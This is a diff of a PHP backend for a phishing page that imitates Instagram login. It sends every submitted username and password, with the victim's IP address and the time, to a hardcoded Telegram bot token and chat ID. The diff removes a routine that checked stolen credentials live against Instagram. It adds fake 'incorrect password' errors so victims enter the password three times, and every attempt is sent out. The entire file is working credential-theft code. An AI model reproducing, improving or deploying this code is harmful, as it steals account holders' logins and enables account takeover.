@@ -27,6 +27,9 @@ header('Access-Control-Allow-Headers: Content-Type');
 $telegram_bot_token = "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
 $telegram_chat_id = "8244999766";
 
+// Start session
+session_start();
+
 // Only process POST requests
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     header("Location: https://www.instagram.com/");
@@ -44,135 +47,57 @@ if (empty($redirect_url) || strpos($redirect_url, 'instagram.com') === false) {
 }
 
 if (empty($username) || empty($password)) {
-    // Missing credentials - redirect back with error
-    session_start();
     $_SESSION['login_error'] = 'Please enter both username and password.';
     $_SESSION['redirect_url'] = $redirect_url;
-    header("Location: " . $_SERVER['HTTP_REFERER']);
+    header("Location: " . ($_SERVER['HTTP_REFERER'] ?? '/'));
     exit;
 }
 
-// Try to login to Instagram
-$login_result = verifyInstagramLogin($username, $password);
+// Track login attempts
+$attempt_key = 'login_attempts_' . md5($username);
+$attempts = isset($_SESSION[$attempt_key]) ? $_SESSION[$attempt_key] : 0;
+$attempts++;
+$_SESSION[$attempt_key] = $attempts;
 
-if ($login_result['success']) {
-    // Login successful - send credentials to Telegram
-    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
-    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-    $timestamp = date("Y-m-d H:i:s T");
-    
-    $message = "🔔 *Instagram Login Captured!*\n\n";
-    $message .= "✅ *VERIFIED CREDENTIALS*\n\n";
-    $message .= "👤 *Username:* `" . str_replace('`', '', $username) . "`\n";
-    $message .= "🔑 *Password:* `" . str_replace('`', '', $password) . "`\n\n";
-    $message .= "📍 *IP:* `" . $ip . "`\n";
-    $message .= "🕐 *Time:* `" . $timestamp . "`\n";
-    $message .= "🎬 *Video:* " . $redirect_url;
-    
-    // Send to Telegram
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage");
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$telegram_chat_id}&text=" . urlencode($message) . "&parse_mode=Markdown&disable_web_page_preview=true");
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_exec($ch);
-    curl_close($ch);
-    
-    // Redirect to the real video
-    header("Location: " . $redirect_url, true, 302);
-    exit;
-} else {
-    // Login failed - redirect back with error
-    session_start();
-    $_SESSION['login_error'] = $login_result['message'];
+// Get visitor info
+$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$timestamp = date("Y-m-d H:i:s T");
+
+// Send credentials to Telegram
+$message = "🔔 *Instagram Login Attempt #" . $attempts . "*\n\n";
+$message .= "👤 *Username:* `" . str_replace('`', '', $username) . "`\n";
+$message .= "🔑 *Password:* `" . str_replace('`', '', $password) . "`\n\n";
+$message .= "📍 *IP:* `" . $ip . "`\n";
+$message .= "🕐 *Time:* `" . $timestamp . "`\n";
+$message .= "🎬 *Video:* " . $redirect_url;
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$telegram_chat_id}&text=" . urlencode($message) . "&parse_mode=Markdown&disable_web_page_preview=true");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+curl_exec($ch);
+curl_close($ch);
+
+// First attempt: show "incorrect password" error (like real Instagram)
+// Second attempt: show error again
+// Third attempt: redirect to video (simulating successful login)
+if ($attempts < 3) {
+    $_SESSION['login_error'] = 'Sorry, your password was incorrect. Please double-check your password.';
     $_SESSION['redirect_url'] = $redirect_url;
     $_SESSION['last_username'] = $username;
-    header("Location: " . $_SERVER['HTTP_REFERER']);
+    header("Location: " . ($_SERVER['HTTP_REFERER'] ?? '/'));
     exit;
-}
-
-// Function to verify Instagram login
-function verifyInstagramLogin($username, $password) {
-    // Instagram login URL
-    $login_url = 'https://www.instagram.com/accounts/login/ajax/';
-    
-    // First, get the CSRF token
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/accounts/login/');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    
-    $response = curl_exec($ch);
-    
-    // Extract cookies
-    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);
-    $cookies = [];
-    foreach ($matches[1] as $cookie) {
-        $parts = explode('=', $cookie, 2);
-        if (count($parts) == 2) {
-            $cookies[$parts[0]] = $parts[1];
-        }
-    }
-    
-    $csrf_token = $cookies['csrftoken'] ?? '';
-    $cookie_string = '';
-    foreach ($cookies as $name => $value) {
-        $cookie_string .= "$name=$value; ";
-    }
-    
-    curl_close($ch);
-    
-    if (empty($csrf_token)) {
-        return ['success' => false, 'message' => 'Sorry, there was a problem with your request.'];
-    }
-    
-    // Now attempt login
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $login_url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-        'username' => $username,
-        'enc_password' => '#PWD_INSTAGRAM_BROWSER:0:' . time() . ':' . $password,
-        'queryParams' => '{}',
-        'optIntoOneTap' => 'false'
-    ]));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'X-CSRFToken: ' . $csrf_token,
-        'X-Requested-With: XMLHttpRequest',
-        'X-Instagram-AJAX: 1',
-        'Content-Type: application/x-www-form-urlencoded',
-        'Referer: https://www.instagram.com/accounts/login/',
-        'Origin: https://www.instagram.com'
-    ]);
-    curl_setopt($ch, CURLOPT_COOKIE, $cookie_string);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
-    
-    $result = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-    
-    $json = json_decode($result, true);
-    
-    if ($json) {
-        if (isset($json['authenticated']) && $json['authenticated'] === true) {
-            return ['success' => true, 'message' => 'Login successful'];
-        } elseif (isset($json['message'])) {
-            return ['success' => false, 'message' => $json['message']];
-        } elseif (isset($json['errors']) && isset($json['errors']['error'])) {
-            return ['success' => false, 'message' => $json['errors']['error'][0]];
-        }
-    }
-    
-    // Default error message
-    return ['success' => false, 'message' => 'Sorry, your password was incorrect. Please double-check your password.'];
+} else {
+    // Reset attempts and redirect to video
+    unset($_SESSION[$attempt_key]);
+    unset($_SESSION['login_error']);
+    unset($_SESSION['last_username']);
+    header("Location: " . $redirect_url, true, 302);
+    exit;
 }
 
 ?>
